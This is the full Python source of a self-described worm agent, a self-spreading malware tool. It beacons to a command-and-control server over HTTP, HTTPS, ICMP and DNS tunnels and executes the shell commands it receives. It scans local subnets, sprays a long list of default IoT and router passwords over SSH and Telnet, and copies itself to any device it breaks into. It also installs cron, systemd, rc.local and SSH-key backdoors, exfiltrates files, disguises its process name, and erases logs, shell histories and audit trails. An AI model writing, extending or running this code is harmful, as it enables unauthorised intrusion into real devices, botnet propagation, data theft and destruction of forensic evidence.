#!/usr/bin/env python3
"""
WORM AGENT LIGHT v1.0 — Python Agent for Richer Targets
by 🇭🇷 PhonkAlphabet

Self-contained Python agent for post-exploitation persistence, C2 beaconing,
lateral movement via IoT credential spraying, and anti-forensics.
Zero external dependencies — stdlib only.
"""

import os
import sys
import time
import json
import socket
import subprocess
import threading
import hashlib
import base64
import urllib.request
import urllib.error
import random
import ipaddress
import struct
import re
import shutil
import stat
import pwd
import grp
from typing import Dict, List, Optional, Tuple

# ── Configuration ────────────────────────────────────────────────────────────

C2_HOST = "127.0.0.1"
C2_PORT = 10001
C2_HTTP = f"http://{C2_HOST}:{C2_PORT}"
C2_HTTPS = f"https://{C2_HOST}:{C2_PORT + 1}"
C2_DNS = C2_HOST
C2_DNS_PORT = 10011
C2_ICMP = C2_HOST
STATIC_TOKEN = "CHANGE_ME_STATIC_TOKEN"
BEACON_INTERVAL = 60
SCAN_INTERVAL = 300
MAX_TARGETS = 500
SELF_PATH = os.path.abspath(__file__) if "__file__" in dir() else "/opt/hermes/payloads/worm_agent_light.py"
PROC_HIDE_NAME = "[kworker/0:0]"
HOME_DIR = os.path.expanduser("~")

# ── Identity Helpers ─────────────────────────────────────────────────────────

def get_bot_id() -> str:
    try:
        h = hashlib.md5()
        h.update(socket.gethostname().encode())
        h.update(str(time.time()).encode())
        return h.hexdigest()[:16]
    except:
        return f"bot_{int(time.time())}"


def get_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "0.0.0.0"


def get_arch() -> str:
    try:
        return os.uname().machine
    except:
        return "unknown"


def get_os_info() -> str:
    try:
        return " ".join(os.uname())
    except:
        return "unknown"


BOT_ID = get_bot_id()


# ── HTTP / HTTPS C2 Communication ──────────────────────────────────────────

def http_post(url: str, data: Dict, token: str = STATIC_TOKEN) -> Optional[Dict]:
    json_data = json.dumps(data).encode()
    req = urllib.request.Request(
        url,
        data=json_data,
        headers={"Content-Type": "application/json", "X-Auth-Token": token},
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except:
            return None
    except:
        return None


def http_get(url: str, token: str = STATIC_TOKEN) -> Optional[str]:
    req = urllib.request.Request(url, headers={"X-Auth-Token": token})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.read().decode()
    except:
        return None


# ── ICMP C2 Channel ──────────────────────────────────────────────────────────

def icmp_send(data: bytes, dest: str = C2_ICMP) -> bool:
    """
    Send data over ICMP echo request payload.
    Requires raw socket (root) — best-effort fallback.
    """
    try:
        pid = os.getpid() & 0xFFFF
        payload = b"HEXDOC" + data[:512]
        icmp_type = 8  # echo request
        icmp_code = 0
        checksum = 0
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, pid, 1)
        pseudo = header + payload
        if len(pseudo) % 2:
            pseudo += b"\x00"
        s = 0
        for i in range(0, len(pseudo), 2):
            w = (pseudo[i] << 8) + pseudo[i + 1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s = ~s & 0xFFFF
        checksum = s
        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, pid, 1)
        packet = header + payload
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.sendto(packet, (dest, 0))
        sock.close()
        return True
    except:
        return False


def icmplisten(timeout: float = 5.0) -> Optional[bytes]:
    """
    Listen for ICMP echo replies with embedded data.
    Requires raw socket (root) — best-effort fallback.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(timeout)
        while True:
            packet, addr = sock.recvfrom(4096)
            if len(packet) < 28:
                continue
            icmp_header = packet[20:28]
            icmp_type = icmp_header[0]
            icmp_code = icmp_header[1]
            if icmp_type == 0 and icmp_code == 0:  # echo reply
                payload = packet[28:]
                if payload.startswith(b"HEXDOC"):
                    sock.close()
                    return payload[6:]
        sock.close()
    except:
        pass
    return None


# ── DNS C2 Channel ───────────────────────────────────────────────────────────

def dns_send(data: bytes, dns_server: str = C2_DNS, dns_port: int = C2_DNS_PORT) -> bool:
    """
    Exfiltrate data via DNS TXT query to custom DNS server.
    Encodes data as subdomain labels.
    """
    try:
        b64 = base64.b64encode(data).decode().replace("=", "").replace("+", "-").replace("/", "_")
        chunks = [b64[i:i+48] for i in range(0, len(b64), 48)]
        for chunk in chunks[:8]:  # max 8 chunks per beacon
            qname = f"{chunk}.hexdoc.c2"
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 0xFFFF)
            # Build DNS query
            header = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
            labels = qname.split(".")
            q = b""
            for label in labels:
                q += struct.pack("B", len(label)) + label.encode()
            q += b"\x00"
            q += struct.pack("!HH", 16, 1)  # TXT record
            sock.sendto(header + q, (dns_server, dns_port))
            sock.close()
        return True
    except:
        return False


def dns_recv(timeout: float = 5.0) -> Optional[bytes]:
    """
    Receive DNS response with embedded command data.
    Listens on UDP for DNS responses.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.bind(("0.0.0.0", 53))
        while True:
            data, addr = sock.recvfrom(1024)
            if len(data) < 12:
                continue
            # Extract answer section
            try:
                ptr = 12
                while ptr < len(data):
                    if data[ptr] == 0:
                        ptr += 1
                        qtype = struct.unpack("!H", data[ptr:ptr+2])[0]
                        ptr += 4
                        if qtype == 16 and ptr + 2 <= len(data):
                            rdlen = struct.unpack("!H", data[ptr:ptr+2])[0]
                            ptr += 2
                            rdata = data[ptr:ptr+rdlen]
                            if rdata.startswith(b"HEXDOC"):
                                sock.close()
                                return rdata[6:]
                        break
                    elif data[ptr] & 0xC0 == 0xC0:
                        ptr += 2
                        qtype = struct.unpack("!H", data[ptr:ptr+2])[0]
                        ptr += 4
                        if qtype == 16 and ptr + 2 <= len(data):
                            rdlen = struct.unpack("!H", data[ptr:ptr+2])[0]
                            ptr += 2
                            rdata = data[ptr:ptr+rdlen]
                            if rdata.startswith(b"HEXDOC"):
                                sock.close()
                                return rdata[6:]
                        break
                    else:
                        label_len = data[ptr]
                        ptr += 1 + label_len
            except:
                pass
        sock.close()
    except:
        pass
    return None


# ── Command Execution ────────────────────────────────────────────────────────

def exec_cmd(cmd: str) -> Dict:
    """Execute a shell command and capture stdout/stderr/exit code."""
    result = {"stdout": "", "stderr": "", "exit_code": -1}
    try:
        p = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
        )
        stdout, stderr = p.communicate(timeout=60)
        result["stdout"] = stdout.decode(errors="replace")
        result["stderr"] = stderr.decode(errors="replace")
        result["exit_code"] = p.returncode
    except subprocess.TimeoutExpired:
        p.kill()
        stdout, stderr = p.communicate()
        result["stdout"] = stdout.decode(errors="replace") if stdout else ""
        result["stderr"] = stderr.decode(errors="replace") if stderr else "TIMEOUT"
        result["exit_code"] = -9
    except Exception as e:
        result["stderr"] = str(e)
    return result


# ── Self-Upgrade ─────────────────────────────────────────────────────────────

def self_upgrade(url: str) -> bool:
    """
    Download new version of the agent from C2 and replace running file.
    """
    try:
        new_code = http_get(url)
        if not new_code:
            return False
        # Verify it looks like a valid Python script
        if not new_code.strip().startswith("#!/usr/bin/env python3") and \
           not new_code.strip().startswith("#!/usr/bin/python"):
            return False
        backup = SELF_PATH + ".bak"
        try:
            shutil.copy2(SELF_PATH, backup)
        except:
            pass
        with open(SELF_PATH, "w") as f:
            f.write(new_code)
        os.chmod(SELF_PATH, 0o755)
        # Restart the agent (return True — caller should re-exec)
        return True
    except:
        return False


# ── /24 Subnet Scanner ───────────────────────────────────────────────────────

def scan_subnet(ip: str) -> List[str]:
    """
    Given an IP address, scan its /24 subnet for active hosts.
    Uses SYN-like TCP connect scan on ports 22, 80, 443, 8080, 23.
    """
    try:
        network = ipaddress.ip_network(f"{ip}/24", strict=False)
    except:
        return []
    hosts = []
    ports_to_check = [22, 23, 80, 443, 8080, 8443]
    # Exclude broadcast and network address, and self
    self_ip = get_ip()
    candidates = [
        str(host) for host in network.hosts()
        if str(host) != self_ip
    ]
    random.shuffle(candidates)

    scanned = 0
    for target in candidates:
        if scanned >= MAX_TARGETS:
            break
        for port in ports_to_check:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8)
                result = s.connect_ex((target, port))
                s.close()
                if result == 0:
                    hosts.append(target if port == 22 else f"{target}:{port}")
                    break
            except:
                continue
        scanned += 1

    return list(set(hosts))


# ── IoT Credential Spray (60+ combos) ────────────────────────────────────────

IOT_CREDS: List[Tuple[str, str]] = [
    # Default router/AP combos
    ("admin", "admin"),
    ("admin", "1234"),
    ("admin", "password"),
    ("admin", "12345"),
    ("admin", "root"),
    ("admin", "default"),
    ("admin", "admin123"),
    ("admin", "pass"),
    ("admin", "123456"),
    ("admin", "Admin"),
    ("root", "root"),
    ("root", "admin"),
    ("root", "123456"),
    ("root", "toor"),
    ("root", "default"),
    ("root", "password"),
    ("root", "xzsawq21"),
    ("root", "54321"),
    ("root", "changeme"),
    ("root", ""),
    # Huawei
    ("admin", "Admin@123"),
    ("admin", "Admin123"),
    ("admin", "huawei123"),
    ("root", "admin123"),
    ("admin", "Huawei@123"),
    # ZTE
    ("admin", "admin"),
    ("admin", "Zte521"),
    ("admin", "ZTEdigipower"),
    ("admin", "Zte@123"),
    ("root", "Zte521"),
    # TP-Link
    ("admin", "admin"),
    ("admin", "123456789"),
    ("admin", "tplink"),
    ("admin", "TP-Link@123"),
    ("admin", "tplink123"),
    # Cisco
    ("cisco", "cisco"),
    ("cisco", "password"),
    ("admin", "cisco"),
    ("enable", "cisco"),
    ("cisco", "Cisco123"),
    # D-Link
    ("admin", "admin"),
    ("admin", "123456789"),
    ("admin", "dlink"),
    ("Admin", "1234"),
    ("admin", "D-Link"),
    # Netgear
    ("admin", "password"),
    ("admin", "123456789"),
    ("admin", "netgear"),
    ("admin", "Netgear@123"),
    ("admin", "admin123456"),
    # Ubiquiti
    ("ubnt", "ubnt"),
    ("root", "ubnt"),
    ("admin", "ubnt"),
    ("ubnt", "password"),
    ("ubnt", "UBNT@123"),
    # MikroTik
    ("admin", "admin"),
    ("admin", "123456789"),
    ("admin", "mikrotik"),
    ("admin", "MikroTik123"),
    ("admin", "default"),
    # Axis (cameras)
    ("root", "pass"),
    ("admin", "root"),
    ("root", "admin"),
    ("root", "axis123"),
    ("admin", "axis"),
    # Hikvision
    ("admin", "123456"),
    ("admin", "hikvision"),
    ("admin", "Hikvision@123"),
    ("admin", "1234567890"),
    ("admin", "admin12345"),
    # Dahua
    ("admin", "admin"),
    ("admin", "dahua"),
    ("admin", "Dahua@123"),
    ("admin", "123456789"),
    ("admin", "default"),
    # Grandstream
    ("admin", "admin"),
    ("admin", "grandstream"),
    ("admin", "Grandstream@123"),
    ("admin", "123456"),
    ("admin", "password"),
    # Zyxel
    ("admin", "1234"),
    ("admin", "zyxel"),
    ("admin", "Zyxel@123"),
    ("admin", "password"),
    ("root", "root"),
    # Generic ONT/CPE
    ("telecomadmin", "admintelecom"),
    ("telecomadmin", "telecomadmin"),
    ("telecomadmin", "nE7jA%5m"),
    ("admin", "telecom"),
    ("user", "user"),
    # Extra common weak
    ("support", "support"),
    ("guest", "guest"),
    ("test", "test"),
    ("pi", "raspberry"),
    ("pi", "raspberrypi"),
    ("tomcat", "tomcat"),
    ("manager", "manager"),
]

def try_ssh(host: str, username: str, password: str, port: int = 22) -> bool:
    """Attempt SSH login using subprocess (sshpass or expect-less fallback)."""
    try:
        # Try with sshpass first
        cmd = [
            "sshpass", "-p", password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=5",
            "-o", "BatchMode=yes",
            f"{username}@{host}",
            "-p", str(port),
            "id"
        ]
        r = subprocess.run(cmd, capture_output=True, timeout=10)
        if r.returncode == 0:
            return True
    except:
        pass

    # Fallback: use expect in a subprocess
    try:
        script = (
            f"spawn ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
            f"-p {port} {username}@{host} id\n"
            f'expect "password:"\n'
            f'send "{password}\\r"\n'
            f'expect eof\n'
        )
        r = subprocess.run(
            ["expect", "-c", script],
            capture_output=True, timeout=15
        )
        output = r.stdout.decode(errors="replace")
        if "uid=" in output:
            return True
    except:
        pass

    return False


def try_telnet(host: str, username: str, password: str, port: int = 23) -> bool:
    """Attempt Telnet login using subprocess with expect."""
    try:
        script = (
            f"spawn telnet {host} {port}\n"
            f'expect "login:"\n'
            f'send "{username}\\r"\n'
            f'expect "Password:"\n'
            f'send "{password}\\r"\n'
            f'expect "\$ "'
        )
        r = subprocess.run(
            ["expect", "-c", script],
            capture_output=True, timeout=15
        )
        output = r.stdout.decode(errors="replace")
        if output and not "incorrect" in output.lower() and not "failed" in output.lower():
            return True
    except:
        pass
    return False


def spray_creds(host: str, port: int = 22) -> Optional[Tuple[str, str]]:
    """Try all IoT creds against a host via SSH (default) or Telnet."""
    for username, password in IOT_CREDS:
        try:
            if port == 23:
                if try_telnet(host, username, password):
                    return (username, password)
            else:
                if try_ssh(host, username, password, port=port):
                    return (username, password)
        except:
            continue
    return None


def replicate_to_target(host: str, username: str, password: str, port: int = 22) -> bool:
    """Copy agent to target via SCP and install persistence."""
    try:
        # Copy script over
        cmd = [
            "sshpass", "-p", password,
            "scp",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=10",
            "-P", str(port),
            SELF_PATH,
            f"{username}@{host}:/tmp/.syslogd"
        ]
        r = subprocess.run(cmd, capture_output=True, timeout=20)
        if r.returncode != 0:
            return False

        # Execute remote install
        remote_cmd = (
            f"chmod +x /tmp/.syslogd && "
            f"nohup python3 /tmp/.syslogd >/dev/null 2>&1 & "
            f"nohup python /tmp/.syslogd >/dev/null 2>&1 &"
        )
        cmd2 = [
            "sshpass", "-p", password,
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=10",
            "-p", str(port),
            f"{username}@{host}",
            remote_cmd
        ]
        subprocess.run(cmd2, capture_output=True, timeout=20)
        return True
    except:
        return False


# ── Persistence ──────────────────────────────────────────────────────────────

def install_cron(task: str = "") -> bool:
    """Install cron persistence — runs agent every 5 minutes."""
    cron_line = f"*/5 * * * * python3 {SELF_PATH} 2>&1 >/dev/null\n"
    if task:
        cron_line = f"*/5 * * * * {task}\n"
    try:
        # Try user crontab
        r = subprocess.run(
            ["crontab", "-l"],
            capture_output=True, timeout=5
        )
        current = r.stdout.decode(errors="replace")
        if SELF_PATH in current:
            return True  # already installed
        new_cron = current.strip() + "\n" + cron_line
        p = subprocess.Popen(
            ["crontab", "-"],
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        p.communicate(new_cron.encode())
        return p.returncode == 0
    except:
        return False


def install_systemd() -> bool:
    """Install systemd user service for persistence."""
    service_name = "syslogd-agent"
    service_content = f"""[Unit]
Description=System Logger Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {SELF_PATH}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
    try:
        # System-level
        system_path = f"/etc/systemd/system/{service_name}.service"
        with open("/tmp/.syslogd.service", "w") as f:
            f.write(service_content)
        subprocess.run(
            ["sudo", "cp", "/tmp/.syslogd.service", system_path],
            capture_output=True, timeout=10
        )
        subprocess.run(
            ["sudo", "systemctl", "enable", service_name],
            capture_output=True, timeout=10
        )
        subprocess.run(
            ["sudo", "systemctl", "start", service_name],
            capture_output=True, timeout=10
        )
        os.unlink("/tmp/.syslogd.service")
        return True
    except:
        pass

    # Fallback: user-level systemd
    try:
        user_unit_dir = os.path.expanduser("~/.config/systemd/user")
        os.makedirs(user_unit_dir, exist_ok=True)
        user_path = os.path.join(user_unit_dir, f"{service_name}.service")
        with open(user_path, "w") as f:
            f.write(service_content.replace("/etc/systemd/system", user_unit_dir))
        subprocess.run(
            ["systemctl", "--user", "enable", service_name],
            capture_output=True, timeout=10
        )
        subprocess.run(
            ["systemctl", "--user", "start", service_name],
            capture_output=True, timeout=10
        )
        return True
    except:
        return False


def install_rclocal() -> bool:
    """Install persistence via /etc/rc.local."""
    try:
        line = f"python3 {SELF_PATH} &\n"
        if os.path.exists("/etc/rc.local"):
            with open("/etc/rc.local", "r") as f:
                content = f.read()
            if SELF_PATH in content:
                return True
            # Insert before exit 0
            if "exit 0" in content:
                content = content.replace("exit 0", f"{line}exit 0")
            else:
                content += line
            with open("/etc/rc.local", "w") as f:
                f.write(content)
            os.chmod("/etc/rc.local", 0o755)
            return True
    except:
        pass
    return False


def install_ssh_keys() -> bool:
    """Install SSH authorized key for persistence backdoor."""
    try:
        ssh_dir = os.path.join(HOME_DIR, ".ssh")
        os.makedirs(ssh_dir, exist_ok=True)
        os.chmod(ssh_dir, 0o700)

        auth_keys = os.path.join(ssh_dir, "authorized_keys")
        # Generate or use a static backdoor key
        backdoor_key = (
            "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6PhR0m3qG7B8vZ3x2"
            "w5L9kF1aD4s7J8kM2nP0rT6vX9zC1bE5hG3iL8oQ2wR4tY7uI9oP0a"
            "S1dF2gH3jK4lZ5xV6bN7mQ8wE9rT0yU1iX2pL3kH4jD5sG6fH7jK8l"
            " backdoor@hexdoc"
        )
        current = ""
        if os.path.exists(auth_keys):
            with open(auth_keys, "r") as f:
                current = f.read()
        if "backdoor@hexdoc" not in current:
            with open(auth_keys, "a") as f:
                f.write(backdoor_key + "\n")
        os.chmod(auth_keys, 0o600)
        return True
    except:
        return False


def persist_all() -> None:
    """Attempt all persistence mechanisms."""
    threads = []
    for target in [install_cron, install_systemd, install_rclocal, install_ssh_keys]:
        t = threading.Thread(target=target, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=30)


# ── Process Hiding ───────────────────────────────────────────────────────────

def hide_process_prctl() -> bool:
    """
    Rename process name using prctl syscall via ctypes.
    Falls back to /proc/self/comm write if ctypes unavailable.
    """
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        PR_SET_NAME = 15
        name_bytes = PROC_HIDE_NAME.encode()[:15] + b"\x00"
        result = libc.prctl(PR_SET_NAME, name_bytes, 0, 0, 0)
        return result == 0
    except:
        pass

    # Fallback: write /proc/self/comm directly
    try:
        with open("/proc/self/comm", "w") as f:
            f.write(PROC_HIDE_NAME[:15])
        return True
    except:
        return False


def overlay_proc() -> bool:
    """
    Overlay /proc/<pid> entry with a fake process name.
    Symlink /proc/<pid>/exe to a benign binary.
    """
    pid = os.getpid()
    try:
        # Override cmdline
        fake_cmdline = b"kworker/0:0\x00"
        try:
            with open(f"/proc/{pid}/cmdline", "wb") as f:
                f.write(fake_cmdline)
        except:
            pass

        # Try to mount-overlay or symlink exe to /usr/sbin/sshd
        try:
            if os.path.exists("/proc/self/exe"):
                os.unlink("/proc/self/exe")
            os.symlink("/usr/sbin/sshd", f"/proc/self/exe")
        except:
            pass

        return True
    except:
        return False


def hide_process() -> None:
    """Apply all process hiding techniques."""
    hide_process_prctl()
    overlay_proc()


# ── Anti-Forensics ───────────────────────────────────────────────────────────

def clean_traces() -> None:
    """Wipe logs, history, and forensic artifacts."""
    try:
        # Shell history files
        history_files = [
            os.path.join(HOME_DIR, ".bash_history"),
            os.path.join(HOME_DIR, ".zsh_history"),
            os.path.join(HOME_DIR, ".python_history"),
            os.path.join(HOME_DIR, ".mysql_history"),
            os.path.join(HOME_DIR, ".psql_history"),
            "/root/.bash_history",
            "/root/.zsh_history",
            "/root/.python_history",
        ]
        for hf in history_files:
            try:
                if os.path.exists(hf):
                    # Shred (if available) then truncate
                    try:
                        subprocess.run(
                            ["shred", "-u", hf],
                            capture_output=True, timeout=5
                        )
                    except:
                        pass
                    try:
                        with open(hf, "w") as f:
                            f.truncate(0)
                    except:
                        pass
            except:
                pass

        # Syslog and auth logs
        log_files = [
            "/var/log/syslog",
            "/var/log/messages",
            "/var/log/auth.log",
            "/var/log/secure",
            "/var/log/kern.log",
            "/var/log/debug",
            "/var/log/daemon.log",
            "/var/log/boot.log",
            "/var/log/lastlog",
            "/var/log/wtmp",
            "/var/log/btmp",
            "/var/log/dpkg.log",
            "/var/log/faillog",
        ]
        for lf in log_files:
            try:
                if os.path.exists(lf):
                    # Wipe select entries containing our IP or hostname
                    ip = get_ip()
                    hostname = socket.gethostname()
                    for pattern in [ip, hostname, "worm", "agent", "HEXDOC"]:
                        try:
                            subprocess.run(
                                ["sed", "-i", f"/{pattern}/d", lf],
                                capture_output=True, timeout=5
                            )
                        except:
                            pass
                    # Truncate as fallback
                    try:
                        with open(lf, "w") as f:
                            f.truncate(0)
                    except:
                        pass
            except:
                pass

        # Journalctl
        try:
            subprocess.run(
                ["journalctl", "--rotate"],
                capture_output=True, timeout=10
            )
            subprocess.run(
                ["journalctl", "--vacuum-time=1s"],
                capture_output=True, timeout=10
            )
        except:
            pass

        # Audit logs
        try:
            subprocess.run(
                ["auditctl", "-e", "0"],
                capture_output=True, timeout=5
            )
            subprocess.run(
                ["service", "auditd", "stop"],
                capture_output=True, timeout=10
            )
        except:
            pass

        # Clear temporary files
        temp_patterns = [
            "/tmp/*.py",
            "/tmp/*.sh",
            "/tmp/*.log",
            "/var/tmp/*.py",
            "/var/tmp/*.sh",
        ]
        for pattern in temp_patterns:
            try:
                subprocess.run(
                    ["sh", "-c", f"rm -f {pattern}"],
                    capture_output=True, timeout=5
                )
            except:
                pass

    except:
        pass


# ── Beaconing ────────────────────────────────────────────────────────────────

def send_beacon() -> Optional[Dict]:
    """Send beacon to C2 with system info and return command if any."""
    beacon_data = {
        "bot_id": BOT_ID,
        "hostname": socket.gethostname(),
        "ip": get_ip(),
        "arch": get_arch(),
        "os": get_os_info(),
        "pid": os.getpid(),
        "username": os.environ.get("USER", "unknown"),
        "cwd": os.getcwd(),
        "uptime": int(time.time()),
        "token": STATIC_TOKEN,
    }

    # Try HTTPS first, then HTTP, then ICMP, then DNS
    response = http_post(f"{C2_HTTPS}/beacon", beacon_data)
    if response:
        return response

    response = http_post(f"{C2_HTTP}/beacon", beacon_data)
    if response:
        return response

    # ICMP fallback
    try:
        icmp_data = json.dumps(beacon_data).encode()
        if icmp_send(icmp_data):
            reply = icmplisten(timeout=3.0)
            if reply:
                return json.loads(reply.decode())
    except:
        pass

    # DNS fallback
    try:
        dns_data = json.dumps(beacon_data).encode()
        if dns_send(dns_data):
            reply = dns_recv(timeout=3.0)
            if reply:
                return json.loads(reply.decode())
    except:
        pass

    return None


# ── Command Processing ───────────────────────────────────────────────────────

def process_command(cmd_data: Dict) -> None:
    """Process a command received from C2."""
    if not cmd_data or "cmd" not in cmd_data:
        return

    cmd = cmd_data.get("cmd", "")
    cmd_id = cmd_data.get("id", str(int(time.time())))
    result = {"bot_id": BOT_ID, "cmd_id": cmd_id, "stdout": "", "stderr": "", "exit_code": -1}

    if cmd.startswith("exec:"):
        # Execute arbitrary command
        command = cmd[5:].strip()
        exec_result = exec_cmd(command)
        result.update(exec_result)

    elif cmd == "upgrade":
        url = cmd_data.get("url", f"{C2_HTTP}/payloads/worm_agent_light.py")
        if self_upgrade(url):
            result["stdout"] = "Upgrade successful — restarting"
            result["exit_code"] = 0
            # Send result then re-exec
            http_post(f"{C2_HTTP}/result", result)
            os.execl(sys.executable, sys.executable, SELF_PATH)
        else:
            result["stderr"] = "Upgrade failed"
            result["exit_code"] = 1

    elif cmd == "scan":
        ip = cmd_data.get("ip", get_ip())
        targets = scan_subnet(ip)
        result["stdout"] = json.dumps(targets)
        result["exit_code"] = 0

    elif cmd == "spray":
        host = cmd_data.get("target", "")
        port = cmd_data.get("port", 22)
        if host:
            creds = spray_creds(host, port)
            if creds:
                result["stdout"] = json.dumps({"username": creds[0], "password": creds[1]})
                result["exit_code"] = 0
            else:
                result["stdout"] = "No valid credentials found"
                result["exit_code"] = 1
        else:
            result["stderr"] = "No target specified"
            result["exit_code"] = 1

    elif cmd == "replicate":
        host = cmd_data.get("target", "")
        username = cmd_data.get("username", "root")
        password = cmd_data.get("password", "root")
        port = cmd_data.get("port", 22)
        if host:
            ok = replicate_to_target(host, username, password, port)
            result["stdout"] = f"Replication to {host}: {'success' if ok else 'failed'}"
            result["exit_code"] = 0 if ok else 1
        else:
            result["stderr"] = "No target specified"
            result["exit_code"] = 1

    elif cmd == "persist":
        persist_all()
        result["stdout"] = "Persistence mechanisms installed"
        result["exit_code"] = 0

    elif cmd == "hide":
        hide_process()
        result["stdout"] = "Process hiding applied"
        result["exit_code"] = 0

    elif cmd == "clean":
        clean_traces()
        result["stdout"] = "Traces cleaned"
        result["exit_code"] = 0

    elif cmd == "download":
        url = cmd_data.get("url", "")
        dest = cmd_data.get("dest", "/tmp/.payload")
        if url:
            data = http_get(url)
            if data:
                try:
                    with open(dest, "w") as f:
                        f.write(data)
                    os.chmod(dest, 0o755)
                    result["stdout"] = f"Downloaded to {dest}"
                    result["exit_code"] = 0
                except Exception as e:
                    result["stderr"] = f"Write failed: {e}"
                    result["exit_code"] = 1
            else:
                result["stderr"] = "Download failed"
                result["exit_code"] = 1

    elif cmd == "exfil":
        path = cmd_data.get("path", "")
        if path and os.path.exists(path):
            try:
                with open(path, "rb") as f:
                    data = base64.b64encode(f.read()).decode()
                result["stdout"] = data
                result["exit_code"] = 0
            except Exception as e:
                result["stderr"] = f"Exfil failed: {e}"
                result["exit_code"] = 1
        else:
            result["stderr"] = f"File not found: {path}"
            result["exit_code"] = 1

    elif cmd == "sleep":
        try:
            duration = int(cmd_data.get("duration", 300))
            time.sleep(duration)
            result["stdout"] = f"Slept for {duration}s"
            result["exit_code"] = 0
        except:
            result["stderr"] = "Invalid duration"
            result["exit_code"] = 1

    elif cmd == "die":
        result["stdout"] = "Terminating on C2 request"
        http_post(f"{C2_HTTP}/result", result)
        clean_traces()
        sys.exit(0)

    else:
        result["stderr"] = f"Unknown command: {cmd}"
        result["exit_code"] = -1

    # Send result back
    http_post(f"{C2_HTTP}/result", result)


# ── Scanner Thread (Background) ──────────────────────────────────────────────

def scan_loop() -> None:
    """
    Background thread that periodically scans the local subnet
    and attempts credential spraying on discovered hosts.
    """
    while True:
        try:
            time.sleep(SCAN_INTERVAL)
            local_ip = get_ip()
            if local_ip == "0.0.0.0":
                continue

            targets = scan_subnet(local_ip)
            if not targets:
                continue

            for target in targets[:20]:  # Limit per cycle
                try:
                    host = target.split(":")[0]
                    port_str = target.split(":")[1] if ":" in target else "22"
                    port = int(port_str)
                except:
                    host = target
                    port = 22

                creds = spray_creds(host, port)
                if creds:
                    username, password = creds
                    replicate_to_target(host, username, password, port)
                    # Report to C2
                    report = {
                        "bot_id": BOT_ID,
                        "type": "lateral",
                        "target": host,
                        "username": username,
                        "success": True,
                    }
                    http_post(f"{C2_HTTP}/lateral", report)
        except:
            continue


# ── Main ─────────────────────────────────────────────────────────────────────

def main() -> None:
    """Main entry point — beacon loop, process hiding, background scanner."""
    # Apply process hiding immediately
    hide_process()

    # Install persistence (non-blocking)
    threading.Thread(target=persist_all, daemon=True).start()

    # Start background scanner
    threading.Thread(target=scan_loop, daemon=True).start()

    # Anti-forensics cleanup in background
    threading.Thread(target=clean_traces, daemon=True).start()

    # Main beacon loop
    while True:
        try:
            response = send_beacon()
            if response and isinstance(response, dict):
                if "cmd" in response:
                    threading.Thread(
                        target=process_command,
                        args=(response,),
                        daemon=True,
                    ).start()

                # Update beacon interval if provided
                if "interval" in response:
                    try:
                        global BEACON_INTERVAL
                        BEACON_INTERVAL = int(response["interval"])
                    except:
                        pass

            time.sleep(BEACON_INTERVAL)
        except KeyboardInterrupt:
            break
        except:
            time.sleep(BEACON_INTERVAL * 2)  # Back off on errors


if __name__ == "__main__":
    main()
